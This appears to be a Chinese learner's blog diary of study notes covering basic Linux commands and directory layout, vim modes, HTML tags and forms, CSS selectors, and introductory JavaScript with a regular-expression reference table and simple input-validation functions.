进程及内核信息存放目录<br>├── root # Root用户家目录<br>├── run # 系统运行时产生临时文件，存放目录<br>├── sbin -&gt; usr&#x2F;sbin # 系统管理命令存放目录<br>├── srv # 服务启动之后需要访问的数据目录<br>├── sys # 系统使用目录<br>├── tmp # 临时文件目录<br>├── usr # 系统命令和帮助文件目录<br>└── var # 存放内容易变的文件的目录</p><ol><li><p>pwd查看当前工作目录<br>clear 清除屏幕<br>cd ~当前用户目录<br>cd &#x2F;根目录<br>cd -上一次访问的目录<br>cd ..上一级目录</p><p>ll查看当前目录下内容（LL的小写）</p><p>mkdir aaa在当前目录下创建aaa目录，相对路径</p><p>find &#x2F; -name ‘b’查询根目录下（包括子目录），名以b的目录和文件；</p><p>mv&#x2F;aaa   &#x2F;bbb 将根目录下aaa目录移到根目录下并重新命名为bbb</p><p>mvbbbb   usr&#x2F;bbb 将当前目录下bbbb目录移到usr目录下并命名为bbb</p><p>cp -r &#x2F;aaa &#x2F;bbb 将&#x2F;目录下的aaa目录复制到&#x2F;bbb目录下，在&#x2F;bbb目录下的名称为aaa</p><p>rm -r &#x2F;bbb普通删除。会询问你是否删除每一个文件<br>rmdir test01目录的删除</p><p>tree test1 树状目录结构</p><p>vim a.java   进入一般模式<br>i           进入插入模式(编辑模式)<br>ESC    退出<br>:wq 保存退出（shift+：调起输入框）<br>:q！不保存退出（内容有更改）(强制退出，不保留更改内容)<br>:q不保存退出（没有内容更改）</p><p>cat&#x2F;more&#x2F;less a.java 文件内容的查看</p><p>head&#x2F;tail -n 7 a.java 前&#x2F;后十行</p><p>grep under 123.txt 在123.txt文件中搜索under字符串 大小写敏感 显示行</p><p>tar zip&#x2F;unzip 压缩命令</p><p>chmod u+x web.xml （—x——）为文件拥有者（user）添加执行权限；<br>chmod g+x web.xml （——x—）为文件拥有者所在组（group）添加执行权限；<br>chmod 111 web.xml  （—x–x–x）为所有用户分类，添加可执行权限；<br>chmod 222 web.xml （–w–w–w-）为所有用户分类，添加可写入权限；<br>chmod 444 web.xml （-r–r–r–）为所有用户分类，添加可读取权限；</p><p><img src="/2022/10/08/learning-diary/Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221009203256213.png" alt="image-20221009203256213"></p><p>ping  184.162.142.132 查看服务器是否可用</p><p>telnet 184.162.142.132 8064 查看服务器端口是否可用</p><p>shutdown 关机</p><p>netstat 显示各种网络信息 如网络连接, 路由表, 接口状态等等;</p><p>netstat -nap |grep pid 查看pid的端口号</p><p>kill -9 2630(pid)  结束进程</p><p>service iptables stop      临时关闭防火墙<br>chkconfig iptables off     防火墙开启不启动<br>service iptables status    查看防火墙状态</p><p>useradd –d &#x2F;usr&#x2F;sum -m sum 添加用户<code>sum</code></p><p>passwd sum 为sum设置密码</p><p>userdel sum 删除用户sum</p><p>groupadd groupname 添加用户组<br>groupmod  -n new-usergroup  usergroup 修改用户组</p><p>sudo -s 用root权限执行命令</p><p>chmod 更改用户组权限</p></li><li><p>vim的编辑器的使用</p></li></ol></li></ol><p>​    1.1      vim 文件名 ：表示将文件用vim编辑器打开</p><ol start="2"><li><pre><code class="hljs">   vim的三种编辑模式 2.1        命令模式               进入vim之后处于命令模式，命令模式下不可插入内容。其他模式时按esc进入命令           模式 ​            命令行模式常用操作命令如下： ​            k j h l        ：分别代表光标的左上下右 移动  2.2        插入模式                     i        ：在光标所在位置前插入  ​                    I        ：在光标所在行行首插入  ​                    a        ：在光标所在位置后插入  ​                    A        ：在光标所在行行尾插入  ​                    o        ：在光标所在行之下另起一行  ​                    O        ：在光标所在行之下另起一行   2.3        底行模式                         在esc进入命令模式后，按“：”进入底行模式，底行模式的常用操作命令如下  ​                    ：wq   保存并退出vim（最常用）  ​                    ：q！  强制退出vim（不保存）  ​                    ：w      保存  ​                    ：q      退出  ​                    ：x       保存并退出，等驾于 ：wq</code></pre></li></ol><h2 id="10-10"><a href="#10-10" class="headerlink" title="10.10"></a>10.10</h2><ol><li>html 开始</li></ol><p>html 结构 页面元素和内容</p><p>css   表现 页面元素的外观和位置,页面样式</p><p>JavaScript 行为  网页模型的定义,页面交互</p><p>html (hyper text markup language):超文本标记语言</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;gb2312&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>菜鸟教程<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>一级标题<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>second title<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>this is the first<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://www.runoob.com&quot;</span> &gt;</span>this is a web<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;100&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;39&quot;</span> /&gt;</span><br>    <br><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="html-元素"><a href="#html-元素" class="headerlink" title="html 元素"></a>html 元素</h4><p>段落 </p><p></p><p></p><p>链接 <a href="default.html">点这里</a></p><br><p>ps:尽量都要使用闭合标签,html对大小写不敏感,但尽量使用小写</p><h4 id="html-属性"><a href="#html-属性" class="headerlink" title="html 属性"></a>html 属性</h4><ol><li><p>元素可以设置属性,一般描述在开始标签中,以名称&#x2F;值对形式出现,例如:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://www.runoob.com&quot;</span>&gt;</span>这是一个链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><br></code></pre></td></tr></table></figure></li></ol><h4 id="列表标签"><a href="#列表标签" class="headerlink" title="列表标签"></a>列表标签</h4><ol><li><p>无序列表 </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>香蕉<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>苹果<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>有序列表</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">ol</span>&gt;</span> <br>      <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>香蕉<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>苹果<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">ol</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>自定义列表</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dl</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">dt</span>&gt;</span>帮助中心<span class="hljs-tag">&lt;/<span class="hljs-name">dt</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>用户指南<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>管理中心<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dl</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ol><h3 id="表格标签"><a href="#表格标签" class="headerlink" title="表格标签"></a>表格标签</h3><ol><li>&#96;&#96;&#96;<br>table border&#x3D;”1” &gt;<br>  <caption><b>学生表单</b></caption><br>  <tr><br>    <th>姓名</th><br>    <th>成绩</th><br>  </tr><br>  <tr><br>    <td>faker</td><br>    <td>0</td><br>  </tr><br><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br>### 表单标签<br><br><span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=&quot;text&quot; 文本框 <span class="hljs-keyword">password</span> radio 单选框 checkbox 多选框<br><br>button 按钮 <span class="hljs-keyword">select</span> 下拉菜单  textarea 文本域  label 联系标签<br><br></code></pre></td></tr></table></figure>username:<input type="text" placeholder="操"><br>password:&lt;input type&#x3D;”password”<br><br><br> 单选框: <input type="radio" name="sex" id="男"> <label for="男">男</label><br> <input type="radio" name="sex" id="女"><label for="女">女</label><br><br> 多选框: <input type="checkbox"><br><br> 文件上传:<input type="file" multiple><br> button:<input type="submit" value="hapde"> <select>   <option>a</option>   <option>b</option>   <option>c</option> </select><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>## <span class="hljs-number">10.11</span><br><br>### css部分<br><br><span class="hljs-number">1.</span> 引入方式 <br><br>   内嵌式 css写在head标签中 style标签中<br><br></code></pre></td></tr></table></figure><style>    /* css */  p {    color:red ;    font-size :30px;   }<br>  </style>  <body>  <p>hava a nice day!</p></body><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>外联式 单独写一个.css文件,通过<span class="hljs-built_in">link</span>标签在网页中引入<br><br>行内式 写在标签的style属性内<br><br></code></pre></td></tr></table></figure><div style="color:green ;font-size :666px;"></div><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### 基础选择器<br><br><span class="hljs-number">1.</span> 标签选择器 选中的所有标签都生效<br><span class="hljs-number">2.</span>  类选择器 <br><br>​         结构: .类名&#123;css属性名:属性值;&#125;      <br><br></code></pre></td></tr></table></figure></li></ol><style>    /* css */  .p {    color:red ;    font-size :30px;   }  </style><body>  <p class="p">hava a nice day!</p></body><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs hsp"><br>一个标签可以使用多个类名,空格隔开<br><br>id选择器 <span class="hljs-meta">#id名</span><br><br>通配符选择器 *<br><br><span class="hljs-meta">### 字体和文本样式</span><br><br><span class="hljs-number">1</span>.字体大小 <span class="hljs-keyword">font</span>-size<br><br> 字体粗细 <span class="hljs-keyword">font</span>-weight<br><br>字体倾斜 <span class="hljs-keyword">font</span>-style <br><br></code></pre></td></tr></table></figure><style>    p {      font-size:30px;    }  </style><body>  <p>have a nice day!</p></body><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br>文字字体 font-family<br><br>文字缩进 text-indent:<span class="hljs-number">2</span>em (首行缩进<span class="hljs-number">2</span>字符)<br><br>水平对齐方式 text-align:left<span class="hljs-regexp">/right/</span>center<br><br>文本修饰 text-decoration:underline/none<br><br>行高 line-hight<br><br><span class="hljs-comment">### 选择器进阶</span><br><br>后代选择器 div p &#123;&#125;<br><br>子代选择器 div &gt; p&#123;&#125;<br><br>并集选择器 div,p,h1 &#123;&#125;<br><br>交集选择器 adiv<br><br>伪类选择器 a:hover<br><br>背景属性 background: color image repeat position <br><br>显示模式存在<br><br><span class="hljs-comment">## 10.12</span><br><br><span class="hljs-comment">### css盒子模型</span><br><br><span class="hljs-comment">### javascript</span><br><br><span class="hljs-number">1</span>. js用法,js代码位于&lt;script&gt;与&lt;/script&gt;标签之间,html中&lt;body&gt;和&lt;head&gt;部分中<br><span class="hljs-number">2</span>. 外部引用js:&lt;script src=<span class="hljs-string">&quot;myScript.js&quot;</span>&gt;&lt;/script&gt;<br><span class="hljs-number">3</span>. js输出 <br>   - 使用 **window.alert()** 弹出警告框。<br>   - 使用 **document.write()** 方法将内容写到 HTML 文档中 会覆盖之前内容.<br>   - 使用 **innerHTML** 写入到 HTML 元素。<br>   - 使用 **console.log()** 写入到浏览器的控制台。<br><span class="hljs-number">4</span>. js 语法<br>   - js字面量<br>   - 变量定义关键字 var <br><br><span class="hljs-comment">## 10.13</span><br><br><span class="hljs-number">1</span>. javascript 语句<br><br>   - 浏览器按照编写顺序依次执行每条语句。<br><br><span class="hljs-number">2</span>. javascript 注释 <br><br>   - <span class="hljs-regexp">//</span>单行注释<br>   - 多行注释 <span class="hljs-regexp">/* 注释内容 */</span><br><br><span class="hljs-number">3</span>. javascript 对象<br><br>   - JavaScript对象:属性和方法的容器;<br><br>     对象的属性之间一定要用逗号隔开;<br><br>     对象的方法定义了一个函数，并作为对象的属性存储。<br><br>     对象方法通过添加 **()** 调用 (作为一个函数)。如果不添加(),则返回函数定义<br><br>   - javaScript对象中属性具有唯一性（这里的属性包括方法），如果有两个重复的属性，则以最后赋值为准<br><br><span class="hljs-number">4</span>. javascript 函数<br><br><span class="hljs-number">5</span>. javascript 作用域<br><br>   - let 允许你声明一个作用域被限制在块级中的变量、语句或者表达式。<br><br>   - 局部变量：在函数中通过var声明的变量。<br><br>     全局变量：在函数外通过var声明的变量。<br><br>     没有声明就使用的变量，默认为全局变量，不论这个变量在哪被使用。<br><br><span class="hljs-number">6</span>. javascript 事件<br><br>   - &lt;*some-HTML-element* *some-event*=<span class="hljs-string">&#x27;JavaScript 代码&#x27;</span>&gt;<br><br>   - | onchange    | HTML 元素改变                        |<br>     | ----------- | ------------------------------------ |<br>     | onclick     | 用户点击 HTML 元素                   |<br>     | onmouseover | 鼠标指针移动到指定的元素上时发生     |<br>     | onmouseout  | 用户从一个 HTML 元素上移开鼠标时发生 |<br>     | onkeydown   | 用户按下键盘按键                     |<br>     | onload      | 浏览器已完成页面的加载               |<br><br><span class="hljs-number">7</span>. javascript 字符串<br><br>   - var x = <span class="hljs-string">&quot;John&quot;</span>;       <br>     var y = new String(<span class="hljs-string">&quot;John&quot;</span>);<br>     (x === y) <span class="hljs-regexp">//</span> 结果为 false，因为 x 是字符串，y 是对象,===为绝对相等<br><br><span class="hljs-number">8</span>. javascript正则表达式<br><br>   - 语法 <span class="hljs-regexp">/正则表达式主体/</span>修饰符(可选) var patt = <span class="hljs-regexp">/runoob/i</span><br><br>   - <br><br>   - | [.](https:<span class="hljs-regexp">//</span>www.runoob.com<span class="hljs-regexp">/jsref/</span>jsref-regexp-dot.html)      | 查找单个字符，除了换行和行结束符。          |<br>     | ------------------------------------------------------------ | ------------------------------------------- |<br>     | [\w](https:<span class="hljs-regexp">//</span>www.runoob.com<span class="hljs-regexp">/jsref/</span>jsref-regexp-wordchar.html) | 查找数字、字母及下划线。                    |<br>     | [\W](https:<span class="hljs-regexp">//</span>www.runoob.com<span class="hljs-regexp">/jsref/</span>jsref-regexp-wordchar-non.html) | 查找非单词字符。                            |<br>     | [\d](https:<span class="hljs-regexp">//</span>www.runoob.com<span class="hljs-regexp">/jsref/</span>jsref-regexp-digit.html)   | 查找数字。                                  |<br>     | [\D](https:<span class="hljs-regexp">//</span>www.runoob.com<span class="hljs-regexp">/jsref/</span>jsref-regexp-digit-non.html) | 查找非数字字符。                            |<br>     | [\s](https:<span class="hljs-regexp">//</span>www.runoob.com<span class="hljs-regexp">/jsref/</span>jsref-regexp-whitespace.html) | 查找空白字符。                              |<br>     | [\S](https:<span class="hljs-regexp">//</span>www.runoob.com<span class="hljs-regexp">/jsref/</span>jsref-regexp-whitespace-non.html) | 查找非空白字符。                            |<br>     | [\b](https:<span class="hljs-regexp">//</span>www.runoob.com<span class="hljs-regexp">/jsref/</span>jsref-regexp-begin.html)   | 匹配单词边界。                              |<br>     | [\B](https:<span class="hljs-regexp">//</span>www.runoob.com<span class="hljs-regexp">/jsref/</span>jsref-regexp-begin-not.html) | 匹配非单词边界。                            |<br>     | \<span class="hljs-number">0</span>                                                           | 查找 NULL 字符。                            |<br>     | [\n](https:<span class="hljs-regexp">//</span>www.runoob.com<span class="hljs-regexp">/jsref/</span>jsref-regexp-newline.html) | 查找换行符。                                |<br>     | \f                                                           | 查找换页符。                                |<br>     | \r                                                           | 查找回车符。                                |<br>     | \t                                                           | 查找制表符。                                |<br>     | \v                                                           | 查找垂直制表符。                            |<br>     | [\xxx](https:<span class="hljs-regexp">//</span>www.runoob.com<span class="hljs-regexp">/jsref/</span>jsref-regexp-octal.html) | 查找以八进制数 xxx 规定的字符。             |<br>     | [\xdd](https:<span class="hljs-regexp">//</span>www.runoob.com<span class="hljs-regexp">/jsref/</span>jsref-regexp-hex.html)   | 查找以十六进制数 dd 规定的字符。            |<br>     | [\uxxxx](https:<span class="hljs-regexp">//</span>www.runoob.com<span class="hljs-regexp">/jsref/</span>jsref-regexp-unicode-hex.html) | 查找以十六进制数 xxxx 规定的 Unicode 字符。 |<br><br>     | [n+](https:<span class="hljs-regexp">//</span>www.runoob.com<span class="hljs-regexp">/jsref/</span>jsref-regexp-onemore.html) | 匹配任何包含至少一个 n 的字符串。例如，<span class="hljs-regexp">/a+/</span> 匹配 <span class="hljs-string">&quot;candy&quot;</span> 中的 <span class="hljs-string">&quot;a&quot;</span>，<span class="hljs-string">&quot;caaaaaaandy&quot;</span> 中所有的 <span class="hljs-string">&quot;a&quot;</span>。 |<br>     | ------------------------------------------------------------ | ------------------------------------------------------------ |<br>     | [n*](https:<span class="hljs-regexp">//</span>www.runoob.com<span class="hljs-regexp">/jsref/</span>jsref-regexp-zeromore.html) | 匹配任何包含零个或多个 n 的字符串。例如，<span class="hljs-regexp">/bo*/</span> 匹配 <span class="hljs-string">&quot;A ghost booooed&quot;</span> 中的 <span class="hljs-string">&quot;boooo&quot;</span>，<span class="hljs-string">&quot;A bird warbled&quot;</span> 中的 <span class="hljs-string">&quot;b&quot;</span>，但是不匹配 <span class="hljs-string">&quot;A goat grunted&quot;</span>。 |<br>     | [n?](https:<span class="hljs-regexp">//</span>www.runoob.com<span class="hljs-regexp">/jsref/</span>jsref-regexp-zeroone.html) | 匹配任何包含零个或一个 n 的字符串。例如，<span class="hljs-regexp">/e?le?/</span> 匹配 <span class="hljs-string">&quot;angel&quot;</span> 中的 <span class="hljs-string">&quot;el&quot;</span>，<span class="hljs-string">&quot;angle&quot;</span> 中的 <span class="hljs-string">&quot;le&quot;</span>。 |<br>     | [n&#123;X&#125;](https:<span class="hljs-regexp">//</span>www.runoob.com<span class="hljs-regexp">/jsref/</span>jsref-regexp-nx.html)    | 匹配包含 X 个 n 的序列的字符串。例如，<span class="hljs-regexp">/a&#123;2&#125;/</span> 不匹配 <span class="hljs-string">&quot;candy,&quot;</span> 中的 <span class="hljs-string">&quot;a&quot;</span>，但是匹配 <span class="hljs-string">&quot;caandy,&quot;</span> 中的两个 <span class="hljs-string">&quot;a&quot;</span>，且匹配 <span class="hljs-string">&quot;caaandy.&quot;</span> 中的前两个 <span class="hljs-string">&quot;a&quot;</span>。 |<br>     | [n&#123;X,&#125;](https:<span class="hljs-regexp">//</span>www.runoob.com<span class="hljs-regexp">/jsref/</span>jsref-regexp-nxcomma.html) | X 是一个正整数。前面的模式 n 连续出现至少 X 次时匹配。例如，<span class="hljs-regexp">/a&#123;2,&#125;/</span> 不匹配 <span class="hljs-string">&quot;candy&quot;</span> 中的 <span class="hljs-string">&quot;a&quot;</span>，但是匹配 <span class="hljs-string">&quot;caandy&quot;</span> 和 <span class="hljs-string">&quot;caaaaaaandy.&quot;</span> 中所有的 <span class="hljs-string">&quot;a&quot;</span>。 |<br>     | [n&#123;X,Y&#125;](https:<span class="hljs-regexp">//</span>www.runoob.com<span class="hljs-regexp">/jsref/</span>jsref-regexp-nxy.html) | X 和 Y 为正整数。前面的模式 n 连续出现至少 X 次，至多 Y 次时匹配。例如，<span class="hljs-regexp">/a&#123;1,3&#125;/</span> 不匹配 <span class="hljs-string">&quot;cndy&quot;</span>，匹配 <span class="hljs-string">&quot;candy,&quot;</span> 中的 <span class="hljs-string">&quot;a&quot;</span>，<span class="hljs-string">&quot;caandy,&quot;</span> 中的两个 <span class="hljs-string">&quot;a&quot;</span>，匹配 <span class="hljs-string">&quot;caaaaaaandy&quot;</span> 中的前面三个 <span class="hljs-string">&quot;a&quot;</span>。注意，当匹配 <span class="hljs-string">&quot;caaaaaaandy&quot;</span> 时，即使原始字符串拥有更多的 <span class="hljs-string">&quot;a&quot;</span>，匹配项也是 <span class="hljs-string">&quot;aaa&quot;</span>。 |<br>     | [n$](https:<span class="hljs-regexp">//</span>www.runoob.com<span class="hljs-regexp">/jsref/</span>jsref-regexp-ndollar.html) | 匹配任何结尾为 n 的字符串。                                  |<br>     | [^n](https:<span class="hljs-regexp">//</span>www.runoob.com<span class="hljs-regexp">/jsref/</span>jsref-regexp-ncaret.html)  | 匹配任何开头为 n 的字符串。                                  |<br>     | [?=n](https:<span class="hljs-regexp">//</span>www.runoob.com<span class="hljs-regexp">/jsref/</span>jsref-regexp-nfollow.html) | 匹配任何其后紧接指定字符串 n 的字符串。                      |<br>     | [?!n](https:<span class="hljs-regexp">//</span>www.runoob.com<span class="hljs-regexp">/jsref/</span>jsref-regexp-nfollow-not.html) | 匹配任何其后没有紧接指定字符串 n 的字符串。                  |<br><br>   - <br><br>   - ```javascript<br>     <span class="hljs-regexp">/*是否带有小数*/</span><br>     <span class="hljs-keyword">function</span>    isDecimal(strValue )  &#123;  <br>        var  objRegExp= <span class="hljs-regexp">/^\d+\.\d+$/</span>;<br>        return  objRegExp.test(strValue);  <br>     &#125;  <br>     <br>     <span class="hljs-regexp">/*校验是否中文名称组成 */</span><br>     <span class="hljs-keyword">function</span> ischina(str) &#123;<br>         var reg=<span class="hljs-regexp">/^[\u4E00-\u9FA5]&#123;2,4&#125;$/</span>;   <span class="hljs-regexp">/*定义验证表达式*/</span><br>         return reg.test(str);     <span class="hljs-regexp">/*进行验证*/</span><br>     &#125;<br>     <br>     <span class="hljs-regexp">/*校验是否全由8位数字组成 */</span><br>     <span class="hljs-keyword">function</span> isStudentNo(str) &#123;<br>         var reg=<span class="hljs-regexp">/^[0-9]&#123;8&#125;$/</span>;   <span class="hljs-regexp">/*定义验证表达式*/</span><br>         return reg.test(str);     <span class="hljs-regexp">/*进行验证*/</span><br>     &#125;<br>     <br>     <span class="hljs-regexp">/*校验电话码格式 */</span><br>     <span class="hljs-keyword">function</span> isTelCode(str) &#123;<br>         var reg= <span class="hljs-regexp">/^((0\d&#123;2,3&#125;-\d&#123;7,8&#125;)|(1[3584]\d&#123;9&#125;))$/</span>;<br>         return reg.test(str);<br>     &#125;<br>     <br>     <span class="hljs-regexp">/*校验邮件地址是否合法 */</span><br>     <span class="hljs-keyword">function</span> IsEmail(str) &#123;<br>         var reg=<span class="hljs-regexp">/^\w+@[a-zA-Z0-9]&#123;2,10&#125;(?:\.[a-z]&#123;2,4&#125;)&#123;1,3&#125;$/</span>;<br>         return reg.test(str);<br>     &#125;<br></code></pre></td></tr></table></figure><ol start="9"><li><p>javascript表单</p><ul><li><p>html表单 **<form>**标签创建表单</form></p></li><li><pre><code class="javascript">&lt;!DOCTYPE 